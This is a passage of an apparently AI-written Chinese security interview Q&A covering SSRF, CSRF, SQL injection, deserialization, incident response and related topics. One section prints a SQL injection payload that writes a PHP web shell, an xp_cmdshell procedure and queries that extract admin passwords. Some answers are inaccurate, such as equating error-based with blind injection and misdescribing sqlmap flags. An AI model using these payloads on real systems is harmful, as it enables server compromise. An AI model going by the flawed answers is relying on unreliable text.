的文件等。</li></ol><h2 id="ssrf是什么"><a href="#ssrf是什么" class="headerlink" title="ssrf是什么"></a>ssrf是什么</h2><p>SSRF（Server-side Request Forgery，服务端请求伪造）是一种攻击技术，攻击者通过在受害者服务器上执行恶意代码，使该服务器对指定的目标URL发起网络请求。这种攻击通常利用了开发人员在编写Web应用程序时没有正确处理用户输入数据的漏洞，例如将用户提供的URL参数直接传递给后台服务器而没有做任何验证。</p><p>在SSRF攻击中，攻击者可以欺骗Web应用程序向其他服务器发送HTTP请求，例如内部服务器、本地网络资源或公共Web API等。攻击者还可以使用SSRF攻击来绕过防火墙保护，访问内部系统，并执行未授权的操作，例如读取机密数据、修改配置文件或上传恶意文件等。</p><p>为了避免SSRF攻击，开发人员需要采取以下措施：</p><ol><li>对所有输入进行严格的验证和过滤：开发人员在编写Web应用程序时应对所有输入数据进行严格的验证和过滤，以确保不会将任何恶意代码或非法请求发送到受害者服务器。</li><li>使用白名单：开发人员可以使用白名单技术限制应用程序仅向可信的服务器发送请求，例如内部服务器或特定的Web API。</li><li>限制服务器端请求发出范围： 在服务器上的Web应用程序必须限制服务器端请求的发出范围，例如通过禁止或限制特定的协议、域名或IP地址，以避免攻击者可以利用SSRF漏洞来发送恶意请求。</li><li>防火墙保护：使用防火墙的隔离技术可帮助防止恶意代码和非法请求进入Web应用程序，并限制其对其他系统的访问。</li></ol><h2 id="ssrf和csrf的区别"><a href="#ssrf和csrf的区别" class="headerlink" title="ssrf和csrf的区别"></a>ssrf和csrf的区别</h2><p>SSRF（Server-side Request Forgery，服务端请求伪造）和CSRF（Cross-site Request Forgery，跨站请求伪造）是两种不同的攻击类型，它们主要的区别在于攻击的目标和方式。</p><p>SSRF攻击是一种通过欺骗服务器来发送恶意请求的攻击技术，攻击者利用服务器上的漏洞进行攻击，并使服务器对指定的目标URL发起网络请求，从而达到恶意操作的目的。SSRF攻击主要针对服务器端应用程序。</p><p>而CSRF攻击则是一种利用用户身份验证信息来执行未经授权的操作的攻击，攻击者通过欺骗用户访问包含恶意代码的网站，来达到获取用户敏感信息、执行交易等攻击目的。CSRF攻击主要针对客户端浏览器。</p><p>另外，防御SSRF攻击和CSRF攻击的方法也有所不同。防御SSRF攻击需要对所有输入进行严格的验证和过滤，并使用白名单技术限制应用程序只向可信的服务器发送请求。而防御CSRF攻击需要使用随机的令牌（如CSRF Token）来验证每个请求的来源是否合法，并防止攻击者能够伪造请求或欺骗用户进行非法操作。</p><p>总之，虽然SSRF攻击和CSRF攻击是两种不同的攻击类型，但它们都需要开发人员采取必要的防御措施来确保Web应用程序和用户数据的安全。</p><h2 id="文件上传如何绕过"><a href="#文件上传如何绕过" class="headerlink" title="文件上传如何绕过"></a>文件上传如何绕过</h2><p>文件上传功能是许多Web应用程序中常见的功能之一，它可以让用户上传各种类型的文件。然而，如果没有正确的安全措施，攻击者可能会利用文件上传功能绕过应用程序的安全性控制并上传恶意文件。以下是一些攻击者可能使用的绕过方法：</p><ol><li>修改文件扩展名：攻击者可以将可执行文件的扩展名更改为其他文件格式的扩展名，例如将.exe文件更改为.jpg文件。这样，即使应用程序检查文件扩展名，也会认为该文件是合法的图像文件。</li><li>绕过文件类型检查：应用程序通常会限制上传文件的MIME类型或文件头，以确保只允许上传合法的文件。但是，攻击者可以通过修改文件头或添加特殊字符等方式来伪装文件类型和内容，从而绕过文件类型检查。</li><li>利用漏洞：应用程序可能存在漏洞，如目录遍历、任意文件上传等漏洞，攻击者可以利用这些漏洞来上传恶意文件，并在服务器上执行任意代码。</li></ol><p>为了防止文件上传漏洞被攻击者利用，开发人员可以采取以下措施：</p><ol><li>对所有上传文件进行严格的验证和过滤：开发人员应该对上传的文件类型、大小、MIME类型等进行严格的验证和过滤，确保只允许上传合法的文件。并且在服务器端进行对上传文件类型、大小、MIME类型等的再次检查。</li><li>为上传文件生成唯一的文件名：开发人员可以为每个上传文件生成唯一的文件名，以避免攻击者通过上传恶意文件来覆盖或修改其他文件。</li><li>使用安全的文件上传库：使用安全的文件上传库，例如PHP的move_uploaded_file函数可以确保文件上传的安全性。</li><li>对上传目录设置权限：只允许应用程序访问上传目录，并设置适当的目录权限，以防止攻击者上传和执行恶意文件。</li></ol><p>总之，开发人员需要对文件上传功能进行充分的安全测试，并采取必要的措施来防止攻击者利用漏洞绕过文件上传功能的安全限制。</p><h2 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h2><p>Java反序列化是一种Java对象序列化（将Java对象转换为字节流）的逆过程，即将字节流重新转换回Java对象。在Java中，可以使用ObjectInputStream类来实现反序列化。虽然Java反序列化本身是一种有用的技术，但它也可能导致安全风险。</p><p>Java反序列化漏洞是指恶意用户通过发送精心构造的序列化数据并触发其反序列化过程，从而执行未经授权的代码或操作。攻击者可以利用此漏洞来执行远程命令、绕过应用程序的安全检查、窃取敏感信息等攻击。</p><p>为了防止Java反序列化漏洞的攻击，开发人员可以采取以下措施：</p><ol><li>处理未信任的数据：开发人员应该避免反序列化未受信任的数据，例如来自不可靠来源的网络请求或从未知来源的文件读取的数据。</li><li>使用安全的序列化库：一些第三方序列化库，如Jackson和Gson等，提供了更加安全的序列化和反序列化功能。开发人员可以使用这些库来避免Java反序列化漏洞。</li><li>实现自定义反序列化方法：对于那些包含重要数据且需要进行反序列化的Java对象，可以实现自定义反序列化方法以控制反序列化过程。</li><li>消除未使用的反序列化代码：如果没有必要进行反序列化操作，开发人员可以将其删除或注释掉，以减少潜在的攻击面。</li><li>定期更新和维护应用程序：及时更新和修复应用程序中的漏洞和错误，并使用相关的安全工具来检测和防止Java反序列化漏洞。</li></ol><p>总之，要解决Java反序列化漏洞，开发人员需要对代码进行充分的安全测试，加强对数据的严格验证和过滤，并采取必要的措施来保护应用程序的安全性。</p><h2 id="sql注入如何写shell"><a href="#sql注入如何写shell" class="headerlink" title="sql注入如何写shell"></a>sql注入如何写shell</h2><p>在SQL注入攻击中，如果攻击者成功地注入了一些恶意的SQL代码，则可以利用这些漏洞来执行各种操作，包括编写shell。以下是攻击者可能使用的几种技术：</p><ol><li>利用UNION SELECT语句：通过构造一个带有UNION SELECT语句的SQL查询，攻击者可以在结果集中插入一些命令，并通过这些命令来编写shell，例如在 MySQL 中可以使用 INTO OUTFILE 来将结果输出到文件中。</li></ol><p>例如，以下语句可以在MySQL中编写shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">http://example.com/products.php?id=1 UNION SELECT &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,2 INTO OUTFILE &quot;/var/www/html/shell.php&quot;;</span><br></pre></td></tr></table></figure><ol><li>利用LOAD_FILE函数：如果应用程序允许使用LOAD_FILE函数加载文件，攻击者可以使用该函数来读取并执行任意的本地shell脚本文件。</li></ol><p>例如，在MySQL中，攻击者可以使用以下代码来读取并执行一个本地shell脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">http://example.com/products.php?id=-1&#x27; UNION SELECT LOAD_FILE(&#x27;/path/to/malicious/script.sh&#x27;),&#x27;&#x27;,&#x27;&#x27;</span><br></pre></td></tr></table></figure><ol><li>利用指定数据库的存储过程：攻击者可以使用存储过程来创建和执行恶意的shell脚本，例如在Microsoft SQL Server中，可以使用以下代码来创建并执行一个命令解释器：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">CREATE PROCEDURE sp_ExecCmd (@cmd varchar(1000))</span><br><span class="line">AS</span><br><span class="line">BEGIN</span><br><span class="line">DECLARE @ret int</span><br><span class="line">EXEC @ret = master..xp_cmdshell @cmd</span><br><span class="line">END</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">EXEC sp_ExecCmd &#x27;command&#x27;</span><br></pre></td></tr></table></figure><p>攻击者利用SQL注入漏洞来执行命令或编写shell是非常危险的，因此，在编写应用程序时必须采用适当的安全措施，例如对所有输入数据进行严格的验证和过滤，并使用参数化查询来避免SQL注入攻击。</p><h2 id="sqlmap中risk和levels区别"><a href="#sqlmap中risk和levels区别" class="headerlink" title="sqlmap中risk和levels区别"></a>sqlmap中risk和levels区别</h2><p>在SQL注入扫描器sqlmap中，-r 参数表示风险等级，-level 参数表示扫描等级。这两个参数的区别如下：</p><ol><li>风险等级（-r 或 –risk）：表示发现漏洞的可能性，取值范围是 1-3，越高表示发现漏洞的可能性越大。在较低的风险等级下，sqlmap只执行少量测试，而在更高的风险等级下，sqlmap会进行更多的测试。</li><li>扫描等级（-level 或 –level）：表示扫描深度和测试量，取值范围是 1-5，越高表示扫描深度越深、测试量越大。在较低的扫描等级下，sqlmap只执行一些基本的测试，而在更高的扫描等级下，sqlmap会执行更多的测试，并探测更多的漏洞类型。</li></ol><p>总之，在使用 sqlmap 进行 SQL 注入扫描时，我们需要根据情况调整风险等级和扫描等级，以达到最优的扫描效果。同时，还需要注意 sqlmap 执行测试过程中对目标系统造成的影响，避免对目标系统产生不必要的影响。</p><h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>报错注入也被称为盲注入，是一种 SQL 注入技术。在报错注入中，攻击者试图向目标系统发送恶意的 SQL 查询并观察系统返回的错误消息，从而了解数据库中存储的敏感数据或执行其它攻击。</p><p>您提到的“报错注入函数”，可能是指用于触发报错注入的 SQL 函数。以下是一些常见的用于报错注入的 SQL 函数：</p><ol><li>SUBSTRING() 函数：该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;users&#x27; LIMIT 1),1,1);</span><br></pre></td></tr></table></figure><ol><li>LENGTH() 函数：该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">SELECT LENGTH((SELECT username from users WHERE id=1));</span><br></pre></td></tr></table></figure><ol><li>ASCII() 函数：该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">SELECT ASCII(SUBSTRING((SELECT password from users WHERE username=&#x27;admin&#x27;),1,1));</span><br></pre></td></tr></table></figure><p>总之，报错注入是一种危险的攻击方式，可以导致泄漏敏感信息、执行未经授权的操作等安全问题。因此，开发人员必须采取适当的安全措施，例如对所有输入数据进行验证和过滤，不要直接拼接 SQL 语句，使用参数化查询等。同时，也应该定期测试应用程序以检测是否存在 SQL 注入漏洞。</p><h2 id="支持报错注入的数据库都有哪些"><a href="#支持报错注入的数据库都有哪些" class="headerlink" title="支持报错注入的数据库都有哪些"></a>支持报错注入的数据库都有哪些</h2><p>报错注入是一种比较常见的 SQL 注入技术，不同的数据库在报错注入方面的支持程度不同。以下是一些主要的数据库和它们在报错注入方面的支持情况：</p><ol><li>MySQL：MySQL 是一个流行的开源关系型数据库管理系统，它对报错注入提供了很好的支持。</li><li>Microsoft SQL Server：Microsoft SQL Server 是微软开发的关系型数据库管理系统，它对报错注入也提供了很好的支持。</li><li>Oracle：Oracle 是一个功能强大的商业级数据库管理系统，它对报错注入的支持相对较差。</li><li>PostgreSQL：PostgreSQL 是一个开源的对象关系型数据库管理系统，它对报错注入的支持相对较好。</li><li>SQLite：SQLite 是一个嵌入式关系型数据库管理系统，它对报错注入的支持较弱。</li></ol><p>总之，在进行 SQL 注入测试时，我们需要针对目标数据库的特定版本和配置进行适当的测试，并注意不同数据库之间在报错注入方面的区别。同时，开发人员在编写应用程序时，应该采取适当的安全措施来防止 SQL 注入攻击。</p><h2 id="一个登录框怎么测试"><a href="#一个登录框怎么测试" class="headerlink" title="一个登录框怎么测试"></a>一个登录框怎么测试</h2><p>对于一个登录框，我们需要进行以下测试：</p><ol><li>验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。</li><li>测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。</li><li>测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。</li><li>测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。</li><li>测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。</li><li>测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。</li><li>测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。</li></ol><p>总之，在测试一个登录框时，我们需要全面考虑各种安全问题，并进行针对性的测试，以确保应用程序的安全。</p><h2 id="csrf产生原因是什么"><a href="#csrf产生原因是什么" class="headerlink" title="csrf产生原因是什么"></a>csrf产生原因是什么</h2><p>CSRF（Cross-Site Request Forgery，跨站请求伪造）攻击是一种常见的 Web 安全漏洞，它利用用户在已登录的情况下访问恶意网站时，绕过同源策略，以用户身份执行未经授权的操作。</p><p>CSRF 攻击产生的原因主要有两个：</p><ol><li>Web 中的一些重要请求不合理地使用了 GET 方法：通常情况下，GET 方法用于获取资源，而 POST 方法用于提交数据。但是，在 Web 应用程序中，有时会把一些重要的请求用 GET 方法来实现，例如修改密码、转账等操作，这样容易被攻击者利用。</li><li>应用程序没有正确验证用户的来源：当应用程序接受到一个请求时，如果没有正确验证请求的来源是否合法，那么攻击者可以通过构造伪造的请求，以用户身份执行未经授权的操作。</li></ol><p>总之，要防止 CSRF 攻击，开发人员需要确保应用程序中所有的关键请求都使用 POST 方法，同时，还需要对请求进行适当的验证和授权，例如添加随机 token 或验证码等机制，以确保请求的来源是合法的。</p><h2 id="sql注入的种类"><a href="#sql注入的种类" class="headerlink" title="sql注入的种类"></a>sql注入的种类</h2><p>SQL注入是一种常见的Web应用程序攻击，攻击者通过执行恶意的SQL查询来窃取敏感信息、修改数据或者执行其他危害行为。根据攻击者的不同攻击手段和目的，SQL注入可以分为以下几种类型：</p><ol><li>基于错误的注入（Error-Based Injection）：该类型的 SQL 注入利用应用程序返回的错误信息来进行攻击，例如通过构造带有语法错误的查询来触发错误信息，攻击者可以从错误消息中获得关于数据库架构和数据的重要信息。</li><li>盲注注入（Blind Injection）：在盲注注入中，攻击者无法直接获取数据库返回的信息，因此需要通过其他方式来推断相关数据。例如，攻击者可以利用时间延迟等机制来判断是否成功注入恶意的SQL语句。</li><li>基于联合查询的注入（Union-Based Injection）：攻击者可以利用 UNION SELECT 语句将两个或多个结果集组合在一起，以获取额外的信息或绕过认证检查。攻击者通常会尝试通过添加 UNION SELECT 语句来向查询中添加恶意代码，例如向查询结果集中添加用户列表或密码信息。</li><li>基于布尔逻辑的注入（Boolean-Based Injection）：在这种类型的 SQL 注入中，攻击者会构造一个查询，该查询会返回一个布尔值，例如真或假。攻击者可以利用这些查询来推断数据库中的数据，例如使用 WHERE 子句构造一个布尔查询来检查某个字段是否存在。</li><li>时间延迟注入（Time-Based Injection）：在时间延迟注入中，攻击者通过向查询中添加时间延迟语句来判断查询是否成功执行。例如，攻击者可以使用 SLEEP() 函数来强制查询等待一段时间，在等待期间观察程序的响应时间来确定注入点是否存在。</li></ol><p>总之，在实际的 SQL 注入攻击中，攻击者通常会结合多种技术和手段，以达到其攻击目的。因此，开发人员需要采取适当的防御措施，例如输入验证、参数化查询、白名单过滤等，来避免 SQL 注入漏洞的出现。</p><h2 id="api环境下sql注入如何防御"><a href="#api环境下sql注入如何防御" class="headerlink" title="api环境下sql注入如何防御"></a>api环境下sql注入如何防御</h2><p>在 API 环境下，防止 SQL 注入攻击的方法和 Web 应用程序类似，主要包括以下几个方面：</p><ol><li>输入验证：开发人员需要对所有输入数据进行有效性验证，包括参数、请求体、请求头等。在验证输入时，可以使用正则表达式或白名单过滤等方法来确保输入数据的合法性。</li><li>参数化查询：在构造 SQL 查询语句时，需要使用参数化查询方式，而不是直接将输入数据拼接到 SQL 查询语句中。参数化查询可以使得 SQL 查询语句与输入数据分离，从而避免 SQL 注入漏洞的出现。</li><li>权限控制：开发人员需要对每个用户进行适当的身份认证和授权，以确保只有经过授权的用户才能访问敏感资源。在授权的过程中，还需要对用户所能访问的数据进行限制，例如使用视图或存储过程来限制用户的访问权限。</li><li>安全审计：监测应用程序的行为并记录日志，以便在发生异常情况时进行排查和调试。安全审计可以帮助开发人员及时发现潜在的漏洞和安全问题，并采取相应的措施加以修复。</li><li>定期更新：定期更新数据库软件及其组件，以确保应用程序使用的数据库软件版本是最新的，从而避免已知漏洞的利用。</li></ol><p>总之，在 API 环境下，开发人员需要采取多种措施来保护应用程序的安全，并避免 SQL 注入攻击的出现。同时，还应该定期进行安全审计和漏洞扫描，及时发现并修复安全问题。</p><h2 id="cs流量特征？"><a href="#cs流量特征？" class="headerlink" title="cs流量特征？"></a>cs流量特征？</h2><p>C/S（Client/Server，客户端/服务器）流量是指基于客户端和服务器之间的通信产生的网络流量。C/S 流量特征包括以下几个方面：</p><ol><li>会话建立：C/S 流量通常都需要进行会话建立，包括握手、协议版本交换、密钥协商等过程。在这个过程中，通常可以看到一些特定的协议字段和标志位。</li><li>数据传输：传输数据是 C/S 流量的主要特征之一。在这个过程中，通常可以看到明文或加密的数据传输，并且数据大小和传输速度也是分析流量的重要指标。</li><li>响应时间：C/S 流量通常包含请求和响应消息，因此可以通过分析请求和响应之间的时间差来判断系统性能和服务质量。</li><li>协议类型：C/S 流量涉及多种不同的协议类型，例如 HTTP、FTP、SMTP、POP3 等，每种协议的特点和流量特征也有所不同。</li><li>应用程序特点：C/S 流量还表现出应用程序的特点，例如应用程序的请求方式、请求频率、用户行为等等，这些特点对于分析和识别流量非常有帮助。</li></ol><p>总之，在分析 C/S 流量时，需要综合考虑多个方面的特征，并结合具体的应用程序和场景进行分析。同时，也需要使用适当的工具和技术，例如协议解码器、流量捕获工具等，来对流量进行捕获和分析。</p><h2 id="msf流量特征？"><a href="#msf流量特征？" class="headerlink" title="msf流量特征？"></a>msf流量特征？</h2><p>MSF（Metasploit Framework）是一个开源的网络安全测试工具，可以用于对系统进行渗透测试和漏洞分析。在使用 MSF 进行攻击时，会产生一些特定的流量特征，包括以下几个方面：</p><ol><li>目标端口：MSF 框架使用多种不同的攻击模块来利用目标系统的漏洞，因此 MSF 流量通常涉及多个不同的目标端口，例如常见的 80、443、445 等端口。</li><li>异常请求：MSF 框架使用恶意代码来对目标系统进行攻击，因此 MSF 流量中通常会出现大量异常请求，例如尝试访问非法 URL、发送恶意数据包等。</li><li>频繁扫描：为了寻找目标系统的漏洞，MSF 框架通常会频繁地进行端口扫描、服务识别等操作，因此 MSF 流量中通常会出现大量扫描和探测请求。</li><li>数据包大小：由于 MSF 框架通常会向目标系统发送大量恶意数据包，因此 MSF 流量中通常会出现较大的数据包大小。</li><li>特殊协议：在攻击过程中，MSF 框架通常会使用一些特殊的协议，例如 Meterpreter、Reverse TCP 等，这些协议在 MSF 流量中通常表现出特定的流量特征。</li></ol><p>总之，在分析 MSF 流量时，需要综合考虑多个方面的特征，并结合具体的攻击模块和服务进行分析。同时，也需要使用适当的工具和技术，例如网络抓包工具、IDS/IPS 等，来对 MSF 流量进行捕获和分析。</p><h2 id="动态链接库劫持应急响应应该怎么做"><a href="#动态链接库劫持应急响应应该怎么做" class="headerlink" title="动态链接库劫持应急响应应该怎么做"></a>动态链接库劫持应急响应应该怎么做</h2><p>动态链接库劫持（也称 DLL 劫持）是一种常见的攻击手段，攻击者通过将恶意 DLL 文件替换为合法的 DLL 文件，从而实现向操作系统注入恶意代码的目的。在发现动态链接库劫持时，应该采取以下措施进行应急响应：</p><ol><li>隔离受影响的系统：立即隔离受影响的系统，并从网络中断开，以避免进一步的攻击和传播。</li><li>恢复被劫持的 DLL 文件：找到被劫持的 DLL 文件，将其从系统中删除，并替换为原始的、正确的 DLL 文件。如果原始的 DLL 文件已经被篡改或删除，需要重新安装相应的软件或应用程序来获取正确的 DLL 文件。</li><li>检查并清除恶意代码：检查被劫持的 DLL 文件是否包含恶意代码，以及其他可能被感染的文件和系统组件。使用杀毒软件和反恶意软件等工具来清除恶意代码。</li><li>修改注册表：修改注册表，防止恶意 DLL 文件再次被加载。例如，可以修改 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs 键值，将所有可信 DLL 文件添加到其中。</li><li>加强安全措施：评估系统的安全性，并加强安全措施。例如，禁用不必要的服务和进程、添加访问控制列表、加密重要数据等。</li></ol><p>总之，在应对动态链接库劫持时，需要快速响应，并采取适当的措施进行恢复和防御，以保护系统和敏感数据的安全性。同时也需要加强监测和预防工作，对系统中的 DLL 文件进行定期检查，并实施安全审计和漏洞扫描等措施，避免类似攻击的再次出现。</p><h2 id="几台服务器在内网，其中一台被打穿，如何排查？"><a href="#几台服务器在内网，其中一台被打穿，如何排查？" class="headerlink" title="几台服务器在内网，其中一台被打穿，如何排查？"></a>几台服务器在内网，其中一台被打穿，如何排查？</h2><p>在一台服务器被攻破后，我们需要快速采取措施进行排查和修复，以下是一些可能的步骤：</p><ol><li>保留现场：在发现一台服务器遭到攻击后，首先要保持现场状态不变，尽量不要修改任何文件或日志。这可以帮助我们更好地了解攻击者的行为、恶意代码的传播路径以及其他可能受到影响的系统或数据。</li><li>收集证据：收集有关攻击的证据，例如入侵检测日志、应用程序日志、网络流量捕获等。这些证据可以帮助我们确定攻击的类型、攻击的时间以及攻击者所使用的工具和技术。</li><li>切断网络连接：为了防止恶意代码继续传播，需要切断受感染服务器与外部网络的连接。这可以通过拔掉网络电缆、关闭相关端口或禁用网络适配器等方法实现。</li><li>分析恶意代码：对受感染服务器上的恶意代码进行分析，以确定其行为、传播方式和危害程度。可以使用杀毒软件、反病毒软件或专业的样本分析工具来进行分析。</li><li>验证系统完整性：验证系统文件和配置是否被恶意代码篡改，例如检查系统文件的哈希值、比较配置文件的差异等。</li><li>进行漏洞扫描：对整个内网进行漏洞扫描，以确保其他服务器没有被攻击。可以使用专业的漏洞扫描工具来进行扫描，例如 Nessus、OpenVAS 等。</li><li>加强安全措施：根据攻击者的入侵方式和攻击的原因，加强系统和网络的安全措施，例如更新补丁、升级软件、增强防火墙规则等。</li></ol><p>总之，在排查一台服务器被攻击后，需要采取快速而有针对性的措施，并结合具体情况进行分析和修复，以保护系统和敏感数据的安全性。</p><h2 id="java内存马有哪几种？"><a href="#java内存马有哪几种？" class="headerlink" title="java内存马有哪几种？"></a>java内存马有哪几种？</h2><p>Java内存马是指一种恶意软件，通过利用Java虚拟机的特性，在目标机器上执行恶意代码，从而控制被感染的机器。以下是几种常见的Java内存马：</p><ol><li>基于反射的内存马：该类型的内存马通过Java反射机制动态加载字节码，绕过了Java程序的安全检查，可以在受害机器上执行任意代码。</li><li>基于Instrumentation的内存马：Instrumentation是Java提供的一组API，可以对正在运行的Java程序进行监控和修改。黑客可以利用这个机制来在目标机器上注入恶意代码。</li><li>基于ClassLoader的内存马：ClassLoader是Java中负责加载类的机制。黑客可以通过自定义ClassLoader来加载恶意代码，从而实现控制目标机器的目的。</li><li>基于JNI的内存马：JNI（Java Native Interface）是Java提供的一组API，可以在Java程序中调用本地代码。黑客可以编写本地代码，并将其作为DLL或SO文件加载到目标机器上，然后通过JNI接口与Java程序通信，从而实现控制目标机器的目的。</li></ol><p>需要注意的是，以上仅列举了部分常见的Java内存马，黑客也可能采用其他方式来实现内存马。为了保护系统的安全，建议及时更新Java版本，并加强对Java程序的安全审计。</p><h2 id="6379是什么端口？"><a href="#6379是什么端口？" class="headerlink" title="6379是什么端口？"></a>6379是什么端口？</h2><p>6379是Redis数据库的默认端口号。Redis是一种基于内存的键值存储系统，支持多种数据结构（如字符串、哈希表、列表等），并提供了丰富的操作命令（如读取、写入、删除等）。6379端口用于客户端与Redis服务器之间进行网络通信，通过这个端口，客户端可以连接到Redis服务器，并对其进行数据读写等操作。同时，6379端口也是黑客攻击Redis服务器的一个常见目标，因此在使用Redis时，需要注意设置好安全配置，保障Redis的安全性。</p><h2 id="7001是什么端口？"><a href="#7001是什么端口？" class="headerlink" title="7001是什么端口？"></a>7001是什么端口？</h2><p>7001是WebLogic服务器的默认管理端口。WebLogic是一种Java应用服务器，常用于企业级应用的开发和部署，其管理控制台可以通过7001端口进行访问和管理。除了管理控制台外，7001端口还用于WebLogic服务器的内部通信，如集群间的通信、容器间的通信等。需要注意的是，由于7001端口是WebLogic服务器的默认端口，因此可能会成为攻击者的攻击目标。在使用WebLogic时，应加强对系统的安全配置，如限制管理控制台的访问权限、设置防火墙规则等，以提高系统的安全性。</p><h2 id="设备上出现log4j，怎么判断攻击成功？"><a href="#设备上出现log4j，怎么判断攻击成功？" class="headerlink" title="设备上出现log4j，怎么判断攻击成功？"></a>设备上出现log4j，怎么判断攻击成功？</h2><p>如果在设备上出现了log4j，则说明攻击者可能利用Log4j漏洞进行攻击，此时可以通过以下方式判断是否真的发生了攻击：</p><ol><li>检查服务器日志：如果攻击成功，一般会在服务器日志中留下明显的痕迹，如未经授权的文件访问、操作系统命令执行等。建议定期检查服务器日志，尤其是涉及敏感数据和关键操作的日志。</li><li>检查网络流量：攻击者在远程操纵受害设备时，一般需要与设备进行网络通信，因此可以通过检查网络流量来判断是否有异常的数据传输行为。建议采用网络监控工具对网络流量进行实时监控，并对异常流量进行警报和记录。</li><li>检查系统进程：攻击者在利用漏洞进行攻击时，可能需要启动或修改一些系统进程，因此可以通过检查系统进程列表来寻找异常行为。建议使用系统监控工具对系统进程进行实时监控，并对异常进程进行警报和记录。</li></ol><p>需要注意的是，出现了Log4j并不意味着攻击一定已经成功，也可能只是正常业务应用中使用了Log4j功能。因此，在判断是否受到攻击时，应该综合考虑多种因素，并采取相应的安全措施。</p><h2 id="设备出现反序列化报警，怎么判断攻击成功？"><a href="#设备出现反序列化报警，怎么判断攻击成功？" class="headerlink" title="设备出现反序列化报警，怎么判断攻击成功？"></a>设备出现反序列化报警，怎么判断攻击成功？</h2><p>当一个设备出现反序列化报警时，可能意味着攻击者已经成功地利用了该设备上的漏洞，并通过发送恶意的数据包来触发该报警。为了判断攻击是否成功，您可以进行以下几个步骤：</p><ol><li>确认报警：首先，您需要确认该报警是否真实存在，而不是一次误报。请检查报警的详细信息，例如报警时间、报警源、报警类型等信息。</li><li>检查攻击路径：根据报警信息，您可以分析攻击者可能使用的攻击路径。例如，他们可能会尝试利用已知的漏洞或弱点来入侵系统，并在其中插入恶意代码。</li><li>搜索事件日志：搜索系统和应用程序的事件日志，以查找任何异常活动或不寻常的行为。您还可以查看系统资源的使用情况，例如CPU、内存和网络流量等，以帮助确定是否有恶意活动正在进行。</li><li>找出攻击者的IP地址：如果您能够找到攻击者的IP地址，请将其与已知的黑名单或威胁情报数据库进行比较，以确定该地址是否已被标记为恶意。</li><li>进行安全审计：最后，您可以进行安全审计以确定是否存在其他漏洞或弱点。这将帮助您修复当前的漏洞，并防止未来类似攻击的发生。</li></ol><p>在所有这些步骤中，最重要的是快速采取行动，以尽快确定并缓解攻击影响。</p><h2 id="fastion漏洞原理？"><a href="#fastion漏洞原理？" class="headerlink" title="fastion漏洞原理？"></a>fastion漏洞原理？</h2><p>“Fastjson” 是一种流行的 Java 序列化库，可用于将 Java 对象转换为 JSON 格式。然而，在 fastjson 序列化和反序列化的过程中，存在一些安全漏洞。其中一个漏洞就是针对 fastjson 反序列化的攻击。</p><p>fastjson 反序列化的攻击原理是通过精心构造的恶意JSON字符串，使得 fastjson 在反序列化时执行恶意代码。攻击者将恶意代码嵌入到JSON字符串中，并利用 fastjson 的某些特性来触发这些代码的执行。攻击者可能会使用这个漏洞来破坏应用程序的完整性、机密性和可用性等方面的保护措施。</p><p>具体来说，攻击者可能会在JSON字符串中添加一些特殊的快捷方式（shortcuts），例如 $ref 和 @type 等，以导致反序列化器创建新的对象实例并执行恶意代码。攻击者还可以利用fastjson中的某些漏洞，使其绕过安全检查，从而成功地执行恶意代码。</p><p>为了防止 fastjson 反序列化漏洞，开发人员需要采取一些预防措施。例如，他们应该避免直接将未经过验证的用户输入传递给 fastjson 反序列化器。开发人员还应该及时更新 fastjson 